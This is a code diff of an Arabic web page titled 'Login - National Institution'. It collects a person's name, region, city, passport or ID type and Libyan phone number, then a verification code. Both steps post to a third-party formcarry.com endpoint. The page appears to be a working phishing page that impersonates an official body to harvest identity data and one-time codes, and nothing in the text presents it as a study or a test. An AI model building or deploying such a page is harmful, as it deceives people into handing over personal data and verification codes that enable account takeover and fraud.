@@ -4,131 +4,90 @@
   <meta charset="UTF-8" />
   <title>تسجيل الدخول - المؤسسة الوطنية</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <link
-    href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap"
-    rel="stylesheet"
-  />
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet" />
   <style>
-    html,
     body {
-      height: 100%;
       margin: 0;
+      background-color: #f0f2f5;
+      font-family: "Cairo", sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
-      background-color: #f0f2f5;
-      font-family: "Cairo", sans-serif;
-    }
-    header {
-      display: none;
+      min-height: 100vh;
     }
     .container {
       width: 100%;
       max-width: 400px;
-      background-color: white;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
-      padding: 20px;
+      background: #fff;
+      padding: 16px 20px;
+      border-radius: 10px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
       box-sizing: border-box;
     }
     label {
       font-weight: bold;
+      margin: 6px 0 4px;
       display: block;
-      margin-top: 12px;
-      margin-bottom: 5px;
+      font-size: 14px;
     }
-    input,
-    button,
-    select {
+    input, select, button {
       width: 100%;
-      padding: 12px 14px;
-      margin-bottom: 10px;
+      padding: 10px;
+      font-size: 15px;
       border: 1px solid #ccc;
       border-radius: 6px;
-      font-size: 16px;
       box-sizing: border-box;
+      margin-bottom: 10px;
+    }
+    .row {
+      display: flex;
+      gap: 10px;
+    }
+    .row > div {
+      flex: 1;
     }
     button {
       background-color: #002147;
       color: white;
       border: none;
-      cursor: pointer;
       font-weight: bold;
+      cursor: pointer;
       transition: background 0.3s;
     }
     button:hover {
       background-color: #003366;
     }
-    .row {
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-    }
-    .row > div {
-      flex: 1;
-    }
     .hidden {
       display: none;
     }
     .timer {
+      text-align: center;
       font-weight: bold;
       color: #006400;
-      text-align: center;
-      font-size: 14px;
       margin-bottom: 10px;
+      font-size: 14px;
     }
   </style>
 </head>
 <body>
   <div class="container">
     <form id="form">
-      <label>الاسم:</label>
-      <input type="text" id="name" name="name" required title="يرجى إدخال الاسم" />
-
       <label>الاسم الكامل:</label>
-      <input
-        type="text"
-        id="fullNameAlt"
-        name="fullNameAlt"
-        required
-        pattern="^[\u0600-\u06FF\s]+$"
-        title="الرجاء كتابة الاسم باللغة العربية فقط."
-      />
+      <input type="text" id="fullname" name="fullname" required pattern="^[\u0600-\u06FF\s]+$" title="الرجاء كتابة الاسم باللغة العربية فقط." />
 
-      <label>الإسم بالكامل:</label>
-      <input
-        type="text"
-        id="fullname"
-        name="fullname"
-        required
-        pattern="^[\u0600-\u06FF\s]+$"
-        title="الرجاء كتابة الاسم باللغة العربية فقط."
-      />
-
-      <label>المنطقة:</label>
-      <input
-        type="text"
-        id="region"
-        name="region"
-        required
-        placeholder="اكتب اسم المنطقة"
-      />
-
-      <label>المدينة:</label>
-      <input
-        type="text"
-        id="city"
-        name="city"
-        required
-        placeholder="اكتب اسم المدينة"
-      />
+      <div class="row">
+        <div>
+          <label>المنطقة:</label>
+          <input type="text" id="region" name="region" required placeholder="مثال: تاجوراء" />
+        </div>
+        <div>
+          <label>المدينة:</label>
+          <input type="text" id="city" name="city" required placeholder="مثال: طرابلس" />
+        </div>
+      </div>
 
       <label>نوع الوثيقة:</label>
-      <select
-        id="documentType"
-        onchange="toggleDocumentField()"
-        required
-      >
+      <select id="documentType" onchange="toggleDocumentField()" required>
         <option value="" disabled selected>اختر نوع الوثيقة</option>
         <option value="جواز سفر">جواز سفر</option>
         <option value="بطاقة شخصية">بطاقة شخصية</option>
@@ -140,14 +99,7 @@
       </div>
 
       <label>رقم الهاتف:</label>
-      <input
-        type="tel"
-        id="phone"
-        name="phone"
-        placeholder="+218xxxxxxxxx"
-        pattern="^\+2189[1-9][0-9]{7}$"
-        required
-      />
+      <input type="tel" id="phone" name="phone" placeholder="+218xxxxxxxxx" pattern="^\+2189[1-9][0-9]{7}$" required />
 
       <button type="button" onclick="sendPhone()">طلب الكود</button>
       <div class="timer" id="countdown" style="display: none">120 ثانية</div>
@@ -155,9 +107,10 @@
       <div class="row">
         <div>
           <label>رمز الكود:</label>
-          <input type="text" id="code" name="code" />
+          <input type="text" id="code" name="code" placeholder="6 إلى 8 أرقام أو حروف" />
         </div>
         <div>
+          <label style="visibility:hidden">_</label>
           <button type="button" onclick="submitWithCode()">تأكيد</button>
         </div>
       </div>
@@ -181,16 +134,13 @@
       }
     }
 
-    // زر طلب الكود: يرسل البيانات بدون شرط وجود الكود
     function sendPhone() {
       const form = document.getElementById("form");
       if (!form.checkValidity()) {
         alert("يرجى تعبئة جميع الحقول بشكل صحيح قبل طلب الكود.");
         return;
       }
-
       const formData = new FormData(form);
-      // إزالة الكود من الإرسال لأنه قد يكون فارغ
       formData.delete("code");
 
       fetch("https://formcarry.com/s/ldfA_DUCDrk", {
@@ -202,11 +152,10 @@
           startCountdown();
         })
         .catch(() => {
-          alert("حدث خطأ أثناء إرسال البيانات، حاول مرة أخرى.");
+          alert("حدث خطأ أثناء الإرسال. حاول لاحقاً.");
         });
     }
 
-    // زر تأكيد وإرسال جميع البيانات: يتحقق من وجود رمز الكود قبل الإرسال
     function submitWithCode() {
       const form = document.getElementById("form");
       if (!form.checkValidity()) {
@@ -216,24 +165,21 @@
 
       const codeInput = document.getElementById("code");
       if (!codeInput.value.trim()) {
-        alert("يرجى إدخال رمز الكود قبل الإرسال.");
+        alert("يرجى إدخال رمز الكود.");
         codeInput.focus();
         return;
       }
 
       const formData = new FormData(form);
-
       fetch("https://formcarry.com/s/ldfA_DUCDrk", {
         method: "POST",
         body: formData,
       })
         .then(() => {
           alert("تم تأكيد البيانات وإرسالها بنجاح.");
-          // يمكن إعادة التعيين أو إعادة التوجيه هنا
-          // form.reset();
         })
         .catch(() => {
-          alert("حدث خطأ أثناء إرسال البيانات، حاول مرة أخرى.");
+          alert("حدث خطأ أثناء الإرسال، حاول مرة أخرى.");
         });
     }
 
@@ -242,7 +188,6 @@
       const countdown = document.getElementById("countdown");
       countdown.style.display = "block";
       countdown.textContent = time + " ثانية";
-
       const interval = setInterval(() => {
         time--;
         countdown.textContent = time + " ثانية";
